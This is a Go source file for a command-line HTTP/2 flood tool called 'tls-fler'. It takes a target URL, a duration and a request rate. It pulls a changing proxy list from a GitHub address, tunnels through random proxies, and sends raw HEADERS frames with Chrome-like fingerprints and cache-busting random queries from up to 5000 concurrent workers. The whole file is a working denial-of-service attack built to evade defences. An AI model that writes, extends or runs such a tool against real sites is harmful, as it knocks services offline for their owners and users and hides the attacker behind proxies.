package main

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2/hpack"
)

// ── constants ─────────────────────────────────────────────────────────────────
const (
	proxyGitURL = "https://raw.githubusercontent.com/malasahjagotwin/restissue/refs/heads/master/proxy/global.txt"

	uaDesktop = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
	uaMobile  = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36"

	secChUaVal      = `"Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="99"`
	platformDesktop = `"Windows"`
	platformMobile  = `"Android"`

	mejiChars = "abcdefghijklmnopqrstuvwxyz0123456789"

	// HTTP/2 client preface
	h2Preface = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
)

var mejiSuffixes = []string{
	"", "App", "Load", "Ts", "Req", "Id", "Cache", "Rand", "Hit", "Src",
	"Tk", "Ver", "Sid", "Uid", "Tag", "Ctx", "Ref", "Env", "Run", "Seq",
}

// ── stats ─────────────────────────────────────────────────────────────────────
var (
	statTotal   int64
	statSuccess int64
	statFailed  int64
)

// ── proxy pool ────────────────────────────────────────────────────────────────
type proxy struct{ host, port, user, pass string }

type proxyPool struct {
	mu   sync.RWMutex
	list []proxy
	fp   string
}

func parseProxies(r io.Reader) []proxy {
	var out []proxy
	sc := bufio.NewScanner(r)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" {
			continue
		}
		p := strings.Split(line, ":")
		if len(p) < 2 {
			continue
		}
		px := proxy{host: p[0], port: p[1]}
		if len(p) >= 4 {
			px.user = p[2]
			px.pass = p[3]
		}
		out = append(out, px)
	}
	return out
}

func fingerprint(list []proxy) string {
	parts := make([]string, len(list))
	for i, p := range list {
		parts[i] = p.host + ":" + p.port
	}
	return strings.Join(parts, "|")
}

func newProxyPool(localPath string) (*proxyPool, error) {
	pp := &proxyPool{}

	resp, err := http.Get(proxyGitURL)
	if err == nil && resp.StatusCode == 200 {
		list := parseProxies(resp.Body)
		resp.Body.Close()
		if len(list) > 0 {
			pp.list = list
			pp.fp = fingerprint(list)
			saveLocal(localPath, list)
			fmt.Printf("[proxy] loaded %d proxies from GitHub\n", len(list))
			return pp, nil
		}
	}

	f, err2 := os.Open(localPath)
	if err2 != nil {
		return nil, fmt.Errorf("cannot load proxies (github: %v, local: %v)", err, err2)
	}
	defer f.Close()
	list := parseProxies(f)
	if len(list) == 0 {
		return nil, fmt.Errorf("proxy file is empty")
	}
	pp.list = list
	pp.fp = fingerprint(list)
	fmt.Printf("[proxy] loaded %d proxies from local file\n", len(list))
	return pp, nil
}

func saveLocal(path string, list []proxy) {
	f, err := os.Create(path)
	if err != nil {
		return
	}
	defer f.Close()
	for _, p := range list {
		if p.user != "" {
			fmt.Fprintf(f, "%s:%s:%s:%s\n", p.host, p.port, p.user, p.pass)
		} else {
			fmt.Fprintf(f, "%s:%s\n", p.host, p.port)
		}
	}
}

func (pp *proxyPool) autoUpdate(localPath string, interval time.Duration) {
	for range time.NewTicker(interval).C {
		resp, err := http.Get(proxyGitURL)
		if err != nil || resp.StatusCode != 200 {
			continue
		}
		list := parseProxies(resp.Body)
		resp.Body.Close()
		if len(list) == 0 {
			continue
		}
		newFP := fingerprint(list)
		pp.mu.Lock()
		if newFP != pp.fp {
			pp.list = list
			pp.fp = newFP
			fmt.Printf("[proxy] updated: %d proxies\n", len(list))
			saveLocal(localPath, list)
		}
		pp.mu.Unlock()
	}
}

func (pp *proxyPool) random() proxy {
	pp.mu.RLock()
	defer pp.mu.RUnlock()
	return pp.list[rand.Intn(len(pp.list))]
}

func (pp *proxyPool) count() int {
	pp.mu.RLock()
	defer pp.mu.RUnlock()
	return len(pp.list)
}

// ── random helpers ────────────────────────────────────────────────────────────
func randStr(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = mejiChars[rand.Intn(len(mejiChars))]
	}
	return string(b)
}

func resolveRand(s string) string {
	for strings.Contains(s, "%RAND%") {
		s = strings.Replace(s, "%RAND%", randStr(rand.Intn(9)+8), 1)
	}
	return s
}

func randomMejiQuery() string {
	n := rand.Intn(3) + 1
	pairs := make([]string, 0, n)
	used := map[string]bool{}
	for i := 0; i < n; i++ {
		var key string
		for {
			key = "meji" + mejiSuffixes[rand.Intn(len(mejiSuffixes))]
			if !used[key] {
				used[key] = true
				break
			}
		}
		pairs = append(pairs, key+"="+randStr(rand.Intn(8)+4))
	}
	return strings.Join(pairs, "&")
}

func buildPath(u *url.URL) string {
	path := resolveRand(pathname(u))
	q := randomMejiQuery()
	if strings.Contains(path, "?") {
		return path + "&" + q
	}
	return path + "?" + q
}

// url.URL doesn't have Pathname, helper:
func pathname(u *url.URL) string {
	p := u.Path
	if p == "" {
		p = "/"
	}
	return p
}

// ── HTTP/2 raw frame helpers ──────────────────────────────────────────────────
// Frame format: 24-bit length | 8-bit type | 8-bit flags | 31-bit stream id | payload

func writeFrame(conn net.Conn, streamID uint32, frameType uint8, flags uint8, payload []byte) error {
	header := make([]byte, 9)
	// length (24 bit)
	header[0] = byte(len(payload) >> 16)
	header[1] = byte(len(payload) >> 8)
	header[2] = byte(len(payload))
	header[3] = frameType
	header[4] = flags
	binary.BigEndian.PutUint32(header[5:], streamID&0x7FFFFFFF)
	_, err := conn.Write(append(header, payload...))
	return err
}

func settingsFrame() []byte {
	// SETTINGS: HEADER_TABLE_SIZE=65536, ENABLE_PUSH=0,
	//           MAX_FRAME_SIZE=6291456, INITIAL_WINDOW_SIZE=262144
	settings := [][2]uint32{
		{0x1, 65536},
		{0x2, 0},
		{0x4, 6291456},
		{0x6, 262144},
	}
	buf := make([]byte, 6*len(settings))
	for i, s := range settings {
		binary.BigEndian.PutUint16(buf[i*6:], uint16(s[0]))
		binary.BigEndian.PutUint32(buf[i*6+2:], s[1])
	}
	return buf
}

func windowUpdateFrame(increment uint32) []byte {
	buf := make([]byte, 4)
	binary.BigEndian.PutUint32(buf, increment)
	return buf
}

// readFrame reads exactly one HTTP/2 frame from conn.
func readFrame(r *bufio.Reader) (frameType uint8, flags uint8, streamID uint32, payload []byte, err error) {
	header := make([]byte, 9)
	if _, err = io.ReadFull(r, header); err != nil {
		return
	}
	length := int(header[0])<<16 | int(header[1])<<8 | int(header[2])
	frameType = header[3]
	flags = header[4]
	streamID = binary.BigEndian.Uint32(header[5:]) & 0x7FFFFFFF
	payload = make([]byte, length)
	if length > 0 {
		_, err = io.ReadFull(r, payload)
	}
	return
}

// ── proxy CONNECT → TLS ───────────────────────────────────────────────────────
func dialTLS(px proxy, host string, port int) (*tls.Conn, error) {
	proxyAddr := net.JoinHostPort(px.host, px.port)
	raw, err := net.DialTimeout("tcp", proxyAddr, 10*time.Second)
	if err != nil {
		return nil, err
	}

	// CONNECT tunnel
	connectReq := fmt.Sprintf("CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\nProxy-Connection: Keep-Alive\r\n",
		host, port, host, port)
	if px.user != "" {
		auth := base64.StdEncoding.EncodeToString([]byte(px.user + ":" + px.pass))
		connectReq += "Proxy-Authorization: Basic " + auth + "\r\n"
	}
	connectReq += "\r\n"

	if _, err := raw.Write([]byte(connectReq)); err != nil {
		raw.Close()
		return nil, err
	}

	// read proxy response
	br := bufio.NewReader(raw)
	resp, err := http.ReadResponse(br, nil)
	if err != nil {
		raw.Close()
		return nil, err
	}
	resp.Body.Close()
	if resp.StatusCode != 200 {
		raw.Close()
		return nil, fmt.Errorf("proxy CONNECT: %s", resp.Status)
	}

	// TLS over tunnel — ALPN h2
	tlsCfg := &tls.Config{
		ServerName:         host,
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2"},
		CurvePreferences:   []tls.CurveID{tls.X25519, tls.CurveP256},
		MinVersion:         tls.VersionTLS12,
		MaxVersion:         tls.VersionTLS13,
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
		},
	}
	tlsConn := tls.Client(raw, tlsCfg)
	tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
	if err := tlsConn.Handshake(); err != nil {
		tlsConn.Close()
		return nil, err
	}
	if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
		tlsConn.Close()
		return nil, fmt.Errorf("server did not negotiate h2")
	}
	tlsConn.SetDeadline(time.Time{})
	return tlsConn, nil
}

// ── HTTP/2 session ────────────────────────────────────────────────────────────
func h2Session(conn *tls.Conn, targetURL *url.URL, rate int, deadline time.Time) {
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(30 * time.Second))

	// send client preface + SETTINGS + WINDOW_UPDATE
	conn.Write([]byte(h2Preface))
	writeFrame(conn, 0, 0x4, 0, settingsFrame())        // SETTINGS
	writeFrame(conn, 0, 0x8, 0, windowUpdateFrame(15663105)) // WINDOW_UPDATE

	br := bufio.NewReader(conn)
	streamID := uint32(1)

	// goroutine: read server frames
	go func() {
		enc := hpack.NewDecoder(4096, nil)
		for {
			ft, flags, _, payload, err := readFrame(br)
			if err != nil {
				return
			}
			switch ft {
			case 0x4: // SETTINGS
				if flags&0x1 == 0 {
					writeFrame(conn, 0, 0x4, 0x1, nil) // ACK
				}
			case 0x8: // WINDOW_UPDATE (connection level) — ignore
			case 0x1: // HEADERS — decode status
				hdrs, err := enc.DecodeFull(payload)
				if err != nil {
					continue
				}
				for _, h := range hdrs {
					if h.Name == ":status" {
						code, _ := strconv.Atoi(h.Value)
						if code >= 200 && code < 500 {
							atomic.AddInt64(&statSuccess, 1)
						} else {
							atomic.AddInt64(&statFailed, 1)
						}
					}
				}
			case 0x6: // PING
				writeFrame(conn, 0, 0x6, 0x1, payload) // PONG
			case 0x7: // GOAWAY
				conn.Close()
				return
			}
		}
	}()

	// write HEADERS frames at rate
	interval := time.Second / time.Duration(rate)

	var hpackBuf strings.Builder
	enc := hpack.NewEncoder(&hpackBuf)

	for time.Now().Before(deadline) {
		conn.SetDeadline(time.Now().Add(30 * time.Second))

		isMobile := rand.Intn(100) < 40
		path := pathname(targetURL)
		path = resolveRand(path)
		path = path + "?" + randomMejiQuery()

		var ua, platform, mobile string
		if isMobile {
			ua = uaMobile
			platform = platformMobile
			mobile = "?1"
		} else {
			ua = uaDesktop
			platform = platformDesktop
			mobile = "?0"
		}

		hpackBuf.Reset()
		headers := []hpack.HeaderField{
			{Name: ":method", Value: "GET"},
			{Name: ":authority", Value: targetURL.Hostname()},
			{Name: ":scheme", Value: "https"},
			{Name: ":path", Value: path},
			{Name: "user-agent", Value: ua},
			{Name: "accept", Value: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
			{Name: "accept-encoding", Value: "gzip, deflate, br"},
			{Name: "accept-language", Value: "en-US,en;q=0.9"},
			{Name: "cache-control", Value: "no-cache"},
			{Name: "sec-ch-ua", Value: secChUaVal},
			{Name: "sec-ch-ua-mobile", Value: mobile},
			{Name: "sec-ch-ua-platform", Value: platform},
			{Name: "sec-fetch-dest", Value: "document"},
			{Name: "sec-fetch-mode", Value: "navigate"},
			{Name: "sec-fetch-site", Value: "none"},
			{Name: "sec-fetch-user", Value: "?1"},
			{Name: "upgrade-insecure-requests", Value: "1"},
			{Name: "dnt", Value: "1"},
		}

		for _, h := range headers {
			enc.WriteField(h)
		}

		encoded := []byte(hpackBuf.String())
		// prepend HPACK priority prefix (same as JS: 0x80,0,0,0,0xFF)
		payload := append([]byte{0x80, 0, 0, 0, 0xFF}, encoded...)

		// END_HEADERS | END_STREAM | PRIORITY
		err := writeFrame(conn, streamID, 0x1, 0x1|0x4|0x20, payload)
		if err != nil {
			return
		}

		atomic.AddInt64(&statTotal, 1)
		streamID += 2

		time.Sleep(interval)
	}
}

// ── worker ────────────────────────────────────────────────────────────────────
func worker(pool *proxyPool, targetURL *url.URL, rate int, duration time.Duration, wg *sync.WaitGroup) {
	defer wg.Done()

	deadline := time.Now().Add(duration)
	port := 443
	if p := targetURL.Port(); p != "" {
		port, _ = strconv.Atoi(p)
	}

	for time.Now().Before(deadline) {
		px := pool.random()
		conn, err := dialTLS(px, targetURL.Hostname(), port)
		if err != nil {
			atomic.AddInt64(&statFailed, 1)
			continue
		}
		h2Session(conn, targetURL, rate, deadline)
	}
}

// ── main ──────────────────────────────────────────────────────────────────────
func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: tls-fler <url> <duration_seconds> <rate_per_second> [proxy/global.txt]")
		fmt.Println("Example: ./tls-fler https://example.com 60 50000")
		fmt.Println("         ./tls-fler https://example.com/%RAND% 60 50000 proxy/global.txt")
		os.Exit(1)
	}

	targetRaw := os.Args[1]
	duration, err := strconv.Atoi(os.Args[2])
	if err != nil || duration <= 0 {
		fmt.Println("Error: duration must be a positive integer")
		os.Exit(1)
	}
	rate, err := strconv.Atoi(os.Args[3])
	if err != nil || rate <= 0 {
		fmt.Println("Error: rate must be a positive integer")
		os.Exit(1)
	}

	localProxyPath := "proxy/global.txt"
	if len(os.Args) >= 5 {
		localProxyPath = os.Args[4]
	}

	targetURL, err := url.Parse(targetRaw)
	if err != nil {
		fmt.Printf("Error: invalid URL: %v\n", err)
		os.Exit(1)
	}

	pool, err := newProxyPool(localProxyPath)
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		os.Exit(1)
	}

	go pool.autoUpdate(localProxyPath, 30*time.Second)

	// concurrency: 1 goroutine per ~100 req/s, max 5000
	concurrency := rate / 100
	if concurrency < 1 {
		concurrency = 1
	}
	if concurrency > 5000 {
		concurrency = 5000
	}

	dur := time.Duration(duration) * time.Second
	perWorker := rate / concurrency
	if perWorker < 1 {
		perWorker = 1
	}

	fmt.Printf("Starting HTTP/2 + proxy tunnel to %s\n", targetURL)
	fmt.Printf("Duration: %ds | Rate: %d req/s | Workers: %d | Proxies: %d\n\n",
		duration, rate, concurrency, pool.count())

	start := time.Now()
	var wg sync.WaitGroup
	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go worker(pool, targetURL, perWorker, dur, &wg)
	}
	wg.Wait()

	elapsed := time.Since(start).Seconds()
	fmt.Println("========== SUMMARY ==========")
	fmt.Printf("Target    : %s\n", targetURL)
	fmt.Printf("Duration  : %.2fs\n", elapsed)
	fmt.Printf("Total Req : %d\n", statTotal)
	fmt.Printf("Success   : %d\n", statSuccess)
	fmt.Printf("Failed    : %d\n", statFailed)
	fmt.Printf("Avg Rate  : %.2f req/s\n", float64(statTotal)/elapsed)
	fmt.Println("=============================")
}
